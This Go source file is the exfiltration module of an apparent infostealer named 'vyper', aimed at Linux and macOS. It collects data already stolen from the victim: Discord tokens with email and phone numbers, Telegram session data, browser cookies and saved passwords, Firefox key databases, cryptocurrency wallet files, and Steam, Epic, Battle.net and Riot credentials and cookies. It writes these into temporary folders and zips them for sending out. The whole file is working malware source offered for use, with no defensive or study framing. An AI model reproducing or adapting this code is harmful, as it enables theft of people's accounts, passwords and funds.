//go:build linux || darwin

package exfiltration

//note: sorry for the unreadability of this all this really does is just make a bunch of stuff into a folder and then zips the folder and returns the byte slice of the zipfile data

import (
	"archive/zip"
	_ "embed"
	"io"
	"math/rand/v2"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	"vyper/Stub/infostealer"
)

//go:embed exfil_text/BrowserInfo.txt
var BrowserInfoText string

//go:embed exfil_text/CryptoWallets.txt
var CryptoInfoText string

//go:embed exfil_text/DiscordUserinfo.txt
var DiscordUserinfoText string

//go:embed exfil_text/GamingInfo.txt
var GamingInfoText string

//go:embed exfil_text/SysInfo_unix.txt
var SysInfoText string

type DataStruct struct {
	SysInfo   infostealer.SysinfoCollector
	Messaging struct {
		DiscordInfo []infostealer.Discord
		Tdata       []byte
	}
	Browsers struct {
		ChromiumInfo infostealer.BrowserList
		GeckoInfo    []infostealer.GeckoBrowser
	}
	CryptoWallets   infostealer.WalletList
	GamingPlatforms infostealer.GamingPlatforms
}

type ZipMap map[string][]byte

func randomstring(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	str := make([]byte, length)
	for i := range str {
		str[i] = charset[rand.IntN(len(charset))]
	}
	return string(str)
}

func setSysinfoLinux(t *infostealer.SysinfoLinux) string {
	content := strings.ReplaceAll(SysInfoText, "ExposedIPPlaceholder", t.ExposedIP)
	content = strings.ReplaceAll(content, "LocationPlaceholder", t.Location)
	content = strings.ReplaceAll(content, "HWIDPlaceholder", t.Hwid)
	content = strings.ReplaceAll(content, "OSVerPlaceholder", t.OSVersion)
	var userstring string
	for _, user := range t.Users {
		str := user.Username +
			"\n\tHome Directory: " + user.HomeDir +
			"\n\tUser ID:        " + user.UserID +
			"\n\tGroup ID:       " + user.GroupID +
			"\n\tShell:          " + user.Shell +
			"\n\tComments:       " + user.Comments + "\n\n"
		userstring = userstring + str
	}
	content = strings.ReplaceAll(content, "PcUsersPlaceholder", userstring)
	var networkstring string
	for _, network := range t.NetworkInfo {
		str := network.Adapter +
			"\n\tMAC Address:    " + network.MacAddr +
			"\n\tIP Address(es): "
		for _, ip := range network.LocalIPs {
			str = str + "\n\t\t" + ip
		}
		str = str + "\n\n"
		networkstring = networkstring + str
	}
	content = strings.ReplaceAll(content, "NetworkInformationPlaceholder", networkstring)
	return content
}

func setSysinfoMac(t *infostealer.SysinfoMac) string {
	content := strings.ReplaceAll(SysInfoText, "ExposedIPPlaceholder", t.ExposedIP)
	content = strings.ReplaceAll(content, "LocationPlaceholder", t.Location)
	content = strings.ReplaceAll(content, "HWIDPlaceholder", t.Hwid)
	var userstring string
	for _, user := range t.Users {
		userstring = userstring + user + "\n"
	}
	content = strings.ReplaceAll(content, "PcUsersPlaceholder", userstring)
	var networkstring string
	for _, network := range t.NetworkInfo {
		str := network.Adapter +
			"\n\tMAC Address:    " + network.MacAddr +
			"\n\tIP Address(es): "
		for _, ip := range network.LocalIPs {
			str = str + "\n\t\t" + ip
		}
		str = str + "\n\n"
		networkstring = networkstring + str
	}
	content = strings.ReplaceAll(content, "NetworkInformationPlaceholder", networkstring)
	return content
}

func (data *DataStruct) Exfiltrate() ZipMap {
	zips := make(ZipMap)

	zipfolderpath := filepath.Join(os.TempDir(), randomstring(15))
	defer os.RemoveAll(zipfolderpath)

	// System info zip
	folderpath := filepath.Join(zipfolderpath, "System")
	os.MkdirAll(folderpath, 0755)

	if data.SysInfo != nil {
		switch t := data.SysInfo.(type) {
		case *infostealer.SysinfoLinux:
			content := setSysinfoLinux(t)
			os.WriteFile(filepath.Join(folderpath, "SystemInformation.txt"), []byte(content), 0644)
		case *infostealer.SysinfoMac:
			content := setSysinfoMac(t)
			os.WriteFile(filepath.Join(folderpath, "SystemInformation.txt"), []byte(content), 0644)
		}
	}

	// Messaging zip
	if data.Messaging.DiscordInfo != nil || data.Messaging.Tdata != nil {
		msgFolder := filepath.Join(zipfolderpath, "Messaging")
		os.MkdirAll(msgFolder, 0755)

		if data.Messaging.DiscordInfo != nil {
			var discordstring string
			for _, token := range data.Messaging.DiscordInfo {
				if token.Userdata.Username == "" {
					continue
				}
				str := token.Userdata.Username +
					"\n\tToken:        " + token.Token +
					"\n\tMFA Enabled:  " + strconv.FormatBool(token.Userdata.MultiFactor)
				switch token.Userdata.Nitro {
				case 0:
					str = str + "\n\tNitro Status: No Nitro"
				case 1:
					str = str + "\n\tNitro Status: Nitro Classic"
				case 2:
					str = str + "\n\tNitro Status: Nitro"
				case 3:
					str = str + "\n\tNitro Status: Nitro Basic"
				}
				str = str +
					"\n\tDisplay Name: " + token.Userdata.DisplayName +
					"\n\tEmail:        " + token.Userdata.Email +
					"\n\tPhone Number: " + token.Userdata.PhoneNumber + "\n\n"
				discordstring = discordstring + str
			}
			if discordstring != "" {
				content := strings.ReplaceAll(DiscordUserinfoText, "DiscordPlaceholder", discordstring)
				os.WriteFile(filepath.Join(msgFolder, "DiscordUserInfo.txt"), []byte(content), 0644)
			}
		}

		if data.Messaging.Tdata != nil {
			os.WriteFile(filepath.Join(msgFolder, "tdata.zip"), data.Messaging.Tdata, 0644)
		}

	}

	// Browser zip
	if data.Browsers.ChromiumInfo != nil || data.Browsers.GeckoInfo != nil {
		brFolder := filepath.Join(zipfolderpath, "Browser")
		os.MkdirAll(brFolder, 0755)

		var browserstring string
		var geckostring string
		if data.Browsers.ChromiumInfo != nil {
			for _, browser := range data.Browsers.ChromiumInfo {
				browserstring = browserstring + browser.Name +
					"\n\tLocal Path: " + browser.Localpath +
					"\n\tProfiles:"
				for _, profile := range browser.Users {
					var cookiestring string
					var passwordstring string
					browserstring = browserstring + "\n\t\t" + profile.Name
					for _, cookie := range profile.Cookies {
						cookiestring = cookiestring + cookie.Name +
							"\n\tDomain: " + cookie.Domain +
							"\n\tValue:  " + cookie.Value + "\n\n"
					}
					for _, password := range profile.Passwords {
						passwordstring = passwordstring + password.Site +
							"\n\tUsername: " + password.Username +
							"\n\tPassword: " + password.Password + "\n\n"
					}
					profFolder := filepath.Join(brFolder, browser.Name, profile.Name)
					os.MkdirAll(profFolder, 0755)
					os.WriteFile(filepath.Join(profFolder, "Cookies.txt"), []byte(cookiestring), 0644)
					os.WriteFile(filepath.Join(profFolder, "Passwords.txt"), []byte(passwordstring), 0644)
				}
			}
		} else {
			browserstring = "None"
		}
		if data.Browsers.GeckoInfo != nil {
			for _, browser := range data.Browsers.GeckoInfo {
				geckostring = geckostring + browser.Name +
					"\n\tLocal Path: " + browser.Localpath +
					"\n\tProfiles:"
				for _, profile := range browser.Profiles {
					geckostring = geckostring + "\n\t\t" + profile.Name
					profFolder := filepath.Join(brFolder, browser.Name, profile.Name)
					os.MkdirAll(profFolder, 0755)
					os.WriteFile(filepath.Join(profFolder, "cookies.sqlite"), profile.Cookies, 0644)
					os.WriteFile(filepath.Join(profFolder, "logins.json"), profile.Logins, 0644)
					os.WriteFile(filepath.Join(profFolder, "key4.db"), profile.Key4DB, 0644)
				}
			}
		} else {
			geckostring = "None"
		}
		if browserstring != "None" || geckostring != "None" {
			content := strings.ReplaceAll(BrowserInfoText, "ChromiumPlaceholder", browserstring)
			content = strings.ReplaceAll(content, "GeckoPlaceholder", geckostring)
			os.WriteFile(filepath.Join(brFolder, "BrowserInformation.txt"), []byte(content), 0644)
		}

	}

	// Crypto zip
	if data.CryptoWallets.ChromiumWallets != nil || data.CryptoWallets.CoreWallets != nil || data.CryptoWallets.FlatWallets != nil {
		cryptoFolder := filepath.Join(zipfolderpath, "Crypto")
		os.MkdirAll(cryptoFolder, 0755)

		var chromiumWalletString string
		var coreWalletString string
		var flatWalletString string
		if data.CryptoWallets.ChromiumWallets != nil {
			for _, wallet := range data.CryptoWallets.ChromiumWallets {
				chromiumWalletString = chromiumWalletString + wallet.Info.Name +
					"\n\tPath: " + wallet.Info.Path + "\n\n"
				walletFolder := filepath.Join(cryptoFolder, "ChromiumWallets", wallet.Info.Name)
				os.MkdirAll(walletFolder, 0755)
				os.WriteFile(filepath.Join(walletFolder, "leveldb.zip"), wallet.LeveldbZip, 0644)
			}
		} else {
			chromiumWalletString = "None"
		}
		if data.CryptoWallets.CoreWallets != nil {
			for _, wallet := range data.CryptoWallets.CoreWallets {
				coreWalletString = coreWalletString + wallet.Info.Name +
					"\n\tPath: " + wallet.Info.Path + "\n\n"
				walletFolder := filepath.Join(cryptoFolder, "CoreWallets", wallet.Info.Name)
				os.MkdirAll(walletFolder, 0755)
				for _, w := range wallet.Wallets {
					os.WriteFile(filepath.Join(walletFolder, w.Name), w.WalletData, 0644)
				}
			}
		} else {
			coreWalletString = "None"
		}
		if data.CryptoWallets.FlatWallets != nil {
			for _, wallet := range data.CryptoWallets.FlatWallets {
				flatWalletString = flatWalletString + wallet.Info.Name +
					"\n\tPath: " + wallet.Info.Path + "\n\n"
				walletFolder := filepath.Join(cryptoFolder, "FlatWallets", wallet.Info.Name)
				os.MkdirAll(walletFolder, 0755)
				for _, file := range wallet.FlatFiles {
					os.WriteFile(filepath.Join(walletFolder, file.Name), file.FileData, 0644)
				}
			}
		} else {
			flatWalletString = "None"
		}
		content := strings.ReplaceAll(CryptoInfoText, "ChromiumPlaceholder", chromiumWalletString)
		content = strings.ReplaceAll(content, "CorePlaceholder", coreWalletString)
		content = strings.ReplaceAll(content, "FlatPlaceholder", flatWalletString)
		os.WriteFile(filepath.Join(cryptoFolder, "CryptoInformation.txt"), []byte(content), 0644)

	}

	// Gaming zip
	if data.GamingPlatforms != nil {
		gameFolder := filepath.Join(zipfolderpath, "Gaming")
		os.MkdirAll(gameFolder, 0755)

		var gamingstring string
		for _, platform := range data.GamingPlatforms {
			gamingstring = gamingstring + platform.Name +
				"\n\tPath: " + platform.Localpath + "\n\n"
			switch true {
			case strings.Contains(platform.Name, "Steam"):
				gamingstring = gamingstring + "\n\tUsers: "
				for _, user := range platform.SteamData.Users {
					gamingstring = gamingstring + user.AccountName +
						"\n\t\tDisplay Name:      " + user.DisplayName +
						"\n\t\tUser ID:           " + user.UserID
					switch user.SSFNCheck {
					case "1":
						gamingstring = gamingstring + "\n\n\tRemember Password: true"
					case "0":
						gamingstring = gamingstring + "\n\n\tRemember Password: false"
					}
					gamingstring = gamingstring + "\n\n"

					steamFolder := filepath.Join(gameFolder, "Steam")
					os.MkdirAll(steamFolder, 0755)
					os.WriteFile(filepath.Join(steamFolder, "loginusers.vdf"), platform.SteamData.FullVDF, 0644)
					for _, file := range platform.SteamData.SSFNs {
						os.WriteFile(filepath.Join(steamFolder, file.Filename), file.File, 0644)
					}
				}
			case strings.Contains(platform.Name, "Epic"):
				var cookiestring string
				for _, cookie := range platform.EpicData.Cookies {
					cookiestring = cookiestring + cookie.Name +
						"\n\tDomain: " + cookie.Domain +
						"\n\tValue:  " + cookie.Value + "\n\n"
				}
				epicFolder := filepath.Join(gameFolder, "Epic")
				os.MkdirAll(epicFolder, 0755)
				os.WriteFile(filepath.Join(epicFolder, "Cookies.txt"), []byte(cookiestring), 0644)
			case strings.Contains(platform.Name, "Battle"):
				gamingstring = gamingstring + "User Info:" +
					"\n\t\tEmail Address:     " + platform.BattleNetData.ClientInfo.Client.Email +
					"\n\t\tRegion:            " + platform.BattleNetData.ClientInfo.Client.Region +
					"\n\t\tRemember Password: " + platform.BattleNetData.ClientInfo.Client.AutoLogin
				var cookiestring string
				for _, cookie := range platform.BattleNetData.Cookies {
					cookiestring = cookiestring + cookie.Name +
						"\n\tDomain: " + cookie.Domain +
						"\n\tValue:  " + cookie.Value + "\n\n"
				}
				battleFolder := filepath.Join(gameFolder, "Battle.net")
				os.MkdirAll(battleFolder, 0755)
				os.WriteFile(filepath.Join(battleFolder, "Cookies.txt"), []byte(cookiestring), 0644)
			case strings.Contains(platform.Name, "Riot"):
				gamingstring = gamingstring + "User Info:" +
					"\n\t\tUsername: " + platform.RiotData.DataWindows.Install.Login.Username +
					"\n\t\tRegion:   " + platform.RiotData.Data.Install.Region + "\n\n"
				var cookiestring string
				for _, cookie := range platform.RiotData.Cookies {
					cookiestring = cookiestring + cookie.Name +
						"\n\tDomain: " + cookie.Domain +
						"\n\tValue:  " + cookie.Value + "\n\n"
				}
				riotFolder := filepath.Join(gameFolder, "Riot")
				os.MkdirAll(riotFolder, 0755)
				os.WriteFile(filepath.Join(riotFolder, "Cookies.txt"), []byte(cookiestring), 0644)
			}
		}
		content := strings.ReplaceAll(GamingInfoText, "PlatformsPlaceholder", gamingstring)
		os.WriteFile(filepath.Join(gameFolder, "GamingInformation.txt"), []byte(content), 0644)

	}

	zipfilepath := filepath.Join(os.TempDir(), randomstring(12)+".zip")
	zipFile, _ := os.Create(zipfilepath)
	zipWriter := zip.NewWriter(zipFile)
	defer os.Remove(zipfilepath)

	filepath.WalkDir(zipfolderpath, func(path string, d os.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		relPath, _ := filepath.Rel(zipfolderpath, path)
		relPath = filepath.ToSlash(relPath)
		writer, _ := zipWriter.Create(relPath)
		file, _ := os.Open(path)
		io.Copy(writer, file)
		file.Close()
		return nil
	})

	zipWriter.Close()
	zipFile.Close()

	zipBytes, _ := os.ReadFile(zipfilepath)
	zips["vyper"] = zipBytes

	return zips
}
